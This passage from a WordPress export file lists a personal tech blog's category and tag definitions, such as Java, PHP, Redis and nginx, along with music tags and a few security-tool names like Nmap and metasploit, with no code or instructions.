		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[google]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Google+]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[291]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[grpc]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[grpc]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[293]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[grpc]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[grpc]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[9]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[hadoop]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Hadoop]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[93]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[hadoop]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Hadoop]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[94]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[hashset]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[HashSet]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[95]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[hkt48]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[HKT48]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[96]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[html]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[html]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[97]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[http]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[http]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[98]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[icmp]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[ICMP]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[99]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[idea]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[IDEA]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[100]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[img]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[img]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[101]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[implements]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[implements]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[102]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[intellij]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[IntelliJ]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[103]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[intellij-idea-15]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[IntelliJ IDEA 15]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[104]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[intent]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[intent]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[105]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[interface]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[interface]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[106]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[ip]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[ip]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[107]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[iptables]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[iptables]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[108]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[iterator]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Iterator]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[10]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[java]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Java]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[109]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[java]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Java]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[11]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[javascript]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Javascript]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[110]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[javascript]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Javascript]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[111]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[jetbrains]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[JetBrains]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[112]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[jquery]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[JQuery]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[113]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[jquery-form-js]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[JQuery.form.js]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[114]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[json]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[json]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[12]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[kong]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Kong]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[13]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[konga]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Konga]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[115]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[kylin]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[kylin]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[14]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[laravel]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Laravel]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[116]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[laravel]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Laravel]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[117]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[lbaas]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[LBaaS]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[118]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[linkedlist]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[LinkedList]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[119]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[linus]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Linus]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[120]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[linux]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Linux]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[121]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[linux-bash]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Linux Bash]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[122]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[list]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[List]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[123]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[lnmp]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[lnmp]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[124]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[lock]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[lock]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[125]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[medusa]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Medusa]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[126]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[metasploit]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[metasploit]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[127]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[mk-pro-l]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[MK PRO L]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[15]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[mongodb]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Mongodb]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[128]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[mongodb]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Mongodb]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[129]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[mysql]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[MySQL]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[130]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[nginx]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[nginx]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[131]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[nmap]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Nmap]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[16]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[one-ok-rock]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[ONE OK ROCK]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[132]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[open-beauty]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[OPEN BEAUTY]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[133]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[openstack]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[OpenStack]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[17]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[other]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Other]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[134]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[pdo]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[PDO]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[135]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[photo]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[photo]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[18]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[php]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[PHP]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[136]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[php]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[php]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[137]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[php-ini]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[php.ini]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[138]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[pin]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[pin]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[139]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[pip]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[pip]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[140]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[post]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[POST]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[292]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[protobuf]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Protobuf]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[294]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[protobuf]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Protobuf]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[141]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[pv]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[pv]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[19]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[python]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Python]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[142]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[python]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[python]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[143]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[queue]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[queue]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[20]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[rabbit-mq]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Rabbit MQ]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[144]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[rabbit-mq]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Rabbit MQ]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[145]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[range]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[range]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[146]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[raspberry-pi]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Raspberry Pi]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[147]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[reaver]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[reaver]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[21]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[redis]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Redis]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[148]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[redis]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Redis]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[149]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[rgb]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[RGB]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[22]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[ruby]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Ruby]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[150]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[ruby]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Ruby]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[151]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[sakura]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[sakura]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[152]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[sdk]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[SDK]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[153]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[select]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[select]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[154]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[serializable]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[serializable]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[155]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[set]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[SET]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[156]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[setuptools]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[setuptools]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[157]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[shadowsocks]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[shadowsocks]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[23]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[category]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[showtime]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[ShowTime]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[158]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[singletop]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[singleTop]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[159]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[social-engineer-toolkit]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Social-Engineer Toolkit]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[160]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[sony]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
		<wp:term_name><![CDATA[Sony]]></wp:term_name>
	</wp:term>
		<wp:term>
		<wp:term_id><![CDATA[161]]></wp:term_id>
		<wp:term_taxonomy><![CDATA[post_tag]]></wp:term_taxonomy>
		<wp:term_slug><![CDATA[sqlite3]]></wp:term_slug>
		<wp:term_parent><![CDATA[]]></wp:term_parent>
